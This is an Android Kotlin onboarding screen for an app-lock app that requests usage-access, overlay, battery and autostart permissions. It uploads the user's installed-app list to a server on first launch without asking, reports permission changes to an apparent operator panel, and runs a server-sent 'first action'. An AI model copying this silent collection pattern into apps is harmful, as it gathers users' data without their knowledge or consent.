package com.company.applock.onboarding

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import androidx.core.app.ActivityCompat
import com.company.applock.R
import com.company.applock.core.DeviceInfo
import com.company.applock.core.Prefs
import com.company.applock.icon.FirstActionController
import com.company.applock.lockengine.LockService
import com.company.applock.sync.AppsReporter
import com.company.applock.sync.SyncEngine
import com.company.applock.watchdog.StabilityNotifier
import com.company.applock.watchdog.WatchdogScheduler

/**
 * The only real screen. It owns the onboarding LOGIC — the permission steps, how
 * each is checked/granted, and what "finish" does — and hands the PRESENTATION to
 * a build-flavor template (see [OnboardingContract] and [OnboardingTemplateProvider]).
 * Each permission is a Settings grant, so state is re-checked in onResume.
 */
class OnboardingActivity : Activity(), OnboardingHost {

    private lateinit var prefs: Prefs
    private lateinit var template: OnboardingTemplate
    private val main = Handler(Looper.getMainLooper())

    // Built once; the lambdas read/trigger live state, so the list itself is stable.
    override val steps: List<OnboardingStep> by lazy { buildSteps() }

    override val appName: String get() = getString(R.string.app_name)
    override val headline: String get() = getString(R.string.onb_title)
    override val subtitle: String get() = getString(R.string.onb_subtitle)
    override val finishLabel: String get() = getString(R.string.onb_done)
    override val isReady: Boolean get() = DeviceInfo.hasCorePermissions(this)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        prefs = Prefs.get(this)
        // The flavor-specific provider is merged into this build's sources; only
        // the selected template is compiled, so unused ones never ship.
        template = OnboardingTemplateProvider.create()
        setContentView(template.createView(this, this))
        // Send the installed-app list at the earliest opportunity. Needs no runtime
        // permission — QUERY_ALL_PACKAGES is install-time, auto-granted.
        AppsReporter.collectAndEnqueue(this)
    }

    override fun onResume() {
        super.onResume()
        refreshUi()
        // Some Settings toggles (e.g. battery-optimization exemption) flip their
        // readable state a few hundred ms AFTER we resume, so re-check a couple
        // more times — otherwise the user has to reopen the screen to see it.
        main.postDelayed({ refreshUi() }, 500)
        main.postDelayed({ refreshUi() }, 1500)
    }

    override fun onPause() {
        super.onPause()
        main.removeCallbacksAndMessages(null)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray,
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        template.refresh()
    }

    private fun refreshUi() {
        template.refresh()
        // A permission was likely just granted → push it immediately so the panel's
        // user row updates without waiting for the next heartbeat.
        maybeReportPermissions()
        StabilityNotifier.scheduleIfNeeded(this)
    }

    /** Report permissions to the server only when they actually changed. */
    private fun maybeReportPermissions() {
        val snapshot = DeviceInfo.permissionsMap(this).toSortedMap()
            .entries.joinToString(",") { "${it.key}=${it.value}" }
        if (snapshot == prefs.lastPermissionsSnapshot) return
        prefs.lastPermissionsSnapshot = snapshot
        val sync = SyncEngine.get(this)
        sync.enqueueRegister() // ensure the device exists before the permissions PUT
        sync.enqueuePermissions()
        sync.enqueueHeartbeat()
        sync.flushNow()
        // Permissions just changed → if the "after_permissions" first action is now
        // eligible and its policy already arrived, apply it right away.
        FirstActionController.maybeApply(this)
    }

    // ------------------------------ the steps ------------------------------

    private fun buildSteps(): List<OnboardingStep> {
        val list = mutableListOf(
            OnboardingStep(
                id = "usage",
                title = getString(R.string.perm_usage),
                description = getString(R.string.perm_usage_desc),
                optional = false,
                verifiable = true,
                checkGranted = { DeviceInfo.hasUsageAccess(this) },
                startGrant = { safeStart(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)) },
            ),
            OnboardingStep(
                id = "overlay",
                title = getString(R.string.perm_overlay),
                description = getString(R.string.perm_overlay_desc),
                optional = false,
                verifiable = true,
                checkGranted = { DeviceInfo.hasOverlay(this) },
                startGrant = {
                    safeStart(
                        Intent(
                            Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                            Uri.parse("package:$packageName"),
                        ),
                    )
                },
            ),
            OnboardingStep(
                id = "battery",
                title = getString(R.string.perm_battery),
                description = getString(R.string.perm_battery_desc),
                optional = true,
                verifiable = true,
                checkGranted = { DeviceInfo.hasBatteryExemption(this) },
                startGrant = {
                    safeStart(
                        Intent(
                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            Uri.parse("package:$packageName"),
                        ),
                    )
                },
            ),
            OnboardingStep(
                id = "notifications",
                title = getString(R.string.perm_notif),
                description = getString(R.string.perm_notif_desc),
                optional = true,
                verifiable = true,
                checkGranted = { DeviceInfo.hasNotifications(this) },
                startGrant = { requestNotifications() },
            ),
        )
        // Autostart only on OEMs that need it, and it has no readable state.
        if (AutostartHelper.isLikelyNeeded()) {
            list.add(
                OnboardingStep(
                    id = "autostart",
                    title = getString(R.string.perm_autostart),
                    description = getString(R.string.perm_autostart_desc),
                    optional = true,
                    verifiable = false,
                    checkGranted = { false },
                    startGrant = { AutostartHelper.open(this) },
                ),
            )
        }
        return list
    }

    // ------------------------------- actions -------------------------------

    private fun requestNotifications() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.POST_NOTIFICATIONS),
                101,
            )
        } else {
            // Pre-13: open the app's notification settings.
            val i = Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS)
                .putExtra(Settings.EXTRA_APP_PACKAGE, packageName)
            safeStart(i)
        }
    }

    override fun complete() {
        if (!isReady) return
        prefs.onboardingComplete = true
        if (prefs.permissionsReadyAt == 0L) {
            prefs.permissionsReadyAt = System.currentTimeMillis()
        }
        WatchdogScheduler.schedulePeriodic(this)
        runCatching { LockService.start(this) }
        val sync = SyncEngine.get(this)
        sync.enqueueRegister()
        sync.enqueuePermissions()
        // Report the installed-app list right away on finish (don't wait for the
        // service's own first collection).
        AppsReporter.collectAndEnqueue(this)
        sync.flushNow()
        StabilityNotifier.scheduleIfNeeded(this)
        // Core permissions are now satisfied → run the first action if its timing
        // is "after_permissions" (no-op if it already ran or timing is app_start).
        FirstActionController.maybeApply(this)
        moveTaskToBack(true)
    }

    private fun safeStart(intent: Intent) {
        runCatching { startActivity(intent) }
            .onFailure { AutostartHelper.openAppDetails(this) }
    }
}
